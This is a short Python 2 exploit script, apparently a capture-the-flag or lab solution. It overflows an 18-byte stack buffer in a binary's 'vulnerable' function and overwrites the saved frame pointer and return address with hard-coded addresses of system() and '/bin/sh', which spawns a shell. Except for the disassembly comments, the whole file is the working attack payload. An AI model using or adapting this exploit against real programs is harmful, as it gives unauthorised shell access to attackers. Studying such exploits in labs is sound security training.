from struct import pack


shell = "/bin/sh"

# disassemble greetings
# 0x08048eed <+13>:	call   0x804a030 <system>
# EBP = 0xbffef238

# disassemble vulnerable
# 0x08048f01 <+13>:	lea    -0x12(%ebp),%eax
# Buf: 0x12 which is Dec 18


system = pack("<I", 0x804a030)
ebp = pack("<I", 0xbffef258) # EBP + 32
sh = pack("<I", 0xbffef248)  # EBP + 16

print "X"*18 + ebp + system + sh + sh + shell
